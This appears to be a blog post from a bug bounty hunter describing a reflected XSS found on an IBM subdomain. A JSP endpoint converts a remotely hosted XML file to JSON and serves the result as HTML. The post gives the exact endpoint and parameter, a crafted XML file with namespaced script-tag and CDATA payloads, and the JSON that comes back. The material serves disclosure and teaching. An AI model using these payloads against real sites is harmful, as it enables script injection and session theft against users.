<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="Khaled Nassar "><meta name=description content="simple writeup about XSS Reflected on ibm subdomain"><meta name=keywords content="bugbounty,cybersecurity,rust,python,zaproxy,devops,devsecops,linux ,websecurity,security automation,bugbounty,security,webpentesting"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://example.com/posts/ibm-xss-reflected-via-xml-files/><title>[IBM] XSS Reflected via xml files :: Khaled Nassar</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=https://example.com/main.154a87e0ff720e102948892a8eb80881aa81a4faf37376f3093be219f6296c3d.css><link rel=apple-touch-icon sizes=180x180 href=https://example.com/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://example.com/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://example.com/favicon-16x16.png><link rel=manifest href=https://example.com/site.webmanifest><link rel=mask-icon href=https://example.com/safari-pinned-tab.svg color><link rel="shortcut icon" href=https://example.com/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content=" [IBM] XSS Reflected via xml files"><meta itemprop=description content="simple writeup about XSS Reflected on ibm subdomain"><meta itemprop=datePublished content="2020-10-26T17:55:28+08:00"><meta itemprop=dateModified content="2020-10-26T17:55:28+08:00"><meta itemprop=wordCount content="246"><meta itemprop=image content="https://example.com"><meta itemprop=keywords content="bugbounty,security,webpentesting,"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://example.com"><meta name=twitter:title content=" [IBM] XSS Reflected via xml files"><meta name=twitter:description content="simple writeup about XSS Reflected on ibm subdomain"><meta property="og:title" content=" [IBM] XSS Reflected via xml files"><meta property="og:description" content="simple writeup about XSS Reflected on ibm subdomain"><meta property="og:type" content="article"><meta property="og:url" content="https://example.com/posts/ibm-xss-reflected-via-xml-files/"><meta property="og:image" content="https://example.com"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-10-26T17:55:28+08:00"><meta property="article:modified_time" content="2020-10-26T17:55:28+08:00"><meta property="article:published_time" content="2020-10-26 17:55:28 +0800 +0800"></head><body><div class=container><header class=header><span class=header__inner><a href=https://example.com/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>$ cd /home/</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://example.com/about/>About</a></li><li><a href=https://example.com/posts/>Posts</a></li><div class=submenu><li class=dropdown><a href=javascript:void(0) class=dropbtn>en</a><div class=dropdown-content></div></li></div></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://example.com/posts/ibm-xss-reflected-via-xml-files/>[IBM] XSS Reflected via xml files</a></h2><div class=post-content><p>Hello World üëã
while I&rsquo;m doing some bug hunting on IBM subdomains I decided instead of using subdomain enumeration I can get interesting endpoints and parameters from <code>waybackurls</code> to shorten the time, after reading the URLs from waybackurls I noticed a lot of endpoints that contain some URLs of XML files in <code>rssurl</code> parameter</p><pre tabindex=0><code>https://www-356.ibm.com/partnerworld/wps/servlet/pwdyn/pw/rss/rsstojson.jsp?ccdb=no&amp;rssurl=https://www-2000.ibm.com/file.xml&amp;_=1596170198353
</code></pre><p><img src=https://1.bp.blogspot.com/-7Dz0qMUTtE0/X5bYy8O2QfI/AAAAAAAAEYw/gioHZXy_lps0DyITLNrJhQFlaCXmV-GHwCLcBGAsYHQ/s1600/Screenshot_at_2020-08-09_18-52-24.png alt=ibm_xml></p><p>all this API endpoint do is read the XML from the URL and then return its value of it but in JSON, for the first time I thought there was an SSRF but after a lot of trying to bypass it, it doesn&rsquo;t work at all</p><p><img src=https://media.tenor.com/RTdXxzgoQewAAAAC/chihuahua-basal.gif alt=noway></p><p>but from another side, I noticed that the response <code>Content-type</code> is <code>text/HTML</code> so I think I can do an xss here, the idea is I can make an XML file that contains the xss payload in one of the variables so after converting it to JSON it will be reflected in the page as an HTML code, like this <code>{"data": "&lt;script>alert(123)&lt;/script>"}</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-XML data-lang=XML><span style=display:flex><span><span style=color:#f92672>&lt;html&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;head&gt;&lt;/head&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;body&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;something:script</span> <span style=color:#a6e22e>xmlns:something=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xhtml&#34;</span><span style=color:#f92672>&gt;</span>alert(1)<span style=color:#f92672>&lt;/something:script&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;a:script</span> <span style=color:#a6e22e>xmlns:a=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xhtml&#34;</span><span style=color:#f92672>&gt;</span>alert(2)<span style=color:#f92672>&lt;/a:script&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;info&gt;</span>
</span></span><span style=display:flex><span>		  <span style=color:#f92672>&lt;name&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;value&gt;</span><span style=color:#75715e>&lt;![CDATA[&lt;script&gt;confirm(document.domain)&lt;/script&gt;]]&gt;</span><span style=color:#f92672>&lt;/value&gt;</span>
</span></span><span style=display:flex><span>		  <span style=color:#f92672>&lt;/name&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;description&gt;</span>
</span></span><span style=display:flex><span>		      <span style=color:#f92672>&lt;value&gt;</span>Hello<span style=color:#f92672>&lt;/value&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;/description&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;url&gt;</span>
</span></span><span style=display:flex><span>		      <span style=color:#f92672>&lt;value&gt;</span>http://google.com<span style=color:#f92672>&lt;/value&gt;</span>
</span></span><span style=display:flex><span>		    <span style=color:#f92672>&lt;/url&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;/info&gt;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>&lt;/body&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/html&gt;</span>
</span></span></code></pre></div><p>then upload the file to my site and pass the URL to the rssurl parameter</p><p>the file should be converted like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-JSON data-lang=JSON><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;html&#34;</span>: {
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;head&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;body&#34;</span>: {
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;script&#34;</span>: [
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;alert(1)&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;alert(2)&#34;</span>
</span></span><span style=display:flex><span>      ],
</span></span><span style=display:flex><span>      <span style=color:#f92672>&#34;info&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;name&#34;</span>: {
</span></span><span style=display:flex><span>          <span style=color:#f92672>&#34;value&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;__cdata&#34;</span>: <span style=color:#e6db74>&#34;&lt;script&gt;confirm(document.domain)&lt;/script&gt;&#34;</span>
</span></span><span style=display:flex><span>          }
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;description&#34;</span>: {
</span></span><span style=display:flex><span>          <span style=color:#f92672>&#34;value&#34;</span>: <span style=color:#e6db74>&#34;Hello&#34;</span>
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;url&#34;</span>: {
</span></span><span style=display:flex><span>          <span style=color:#f92672>&#34;value&#34;</span>: <span style=color:#e6db74>&#34;http://google.com&#34;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>and boom</p><p><img src=https://1.bp.blogspot.com/-BHQh_JQb0Uc/X5bZv80_nnI/AAAAAAAAEY8/hn-Ok2MGjcca4ixkIZpeUgQ1kqCYH5OvwCLcBGAsYHQ/s1600/Screenshot_at_2020-08-09_18-54-51.png alt=xss_boom></p><p>see ya ü§û ‚ù§Ô∏è</p></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg><span class=tag><a href=https://example.com/tags/bugbounty/>bugbounty</a></span>
<span class=tag><a href=https://example.com/tags/security/>security</a></span>
<span class=tag><a href=https://example.com/tags/webpentesting/>webpentesting</a></span></p></div></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2023</span>
<span><a href=https://example.com>Khaled Nassar</a></span>
<span>NonCommercial 4.0 International License</span>
<span><a href=https://example.com/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div></footer></div><script type=text/javascript src=https://example.com/bundle.min.feebdc8d801e3fb1791305e362b6d11557f029604dd5b3c27e2686bc88787ee90ae1ccf0afe81bd7d959d7617cfe1fc73062aa82b4e1fa830d6941193d2cbddf.js integrity="sha512-/uvcjYAeP7F5EwXjYrbRFVfwKWBN1bPCfiaGvIh4fukK4czwr+gb19lZ12F8/h/HMGKqgrTh+oMNaUEZPSy93w=="></script></body></html>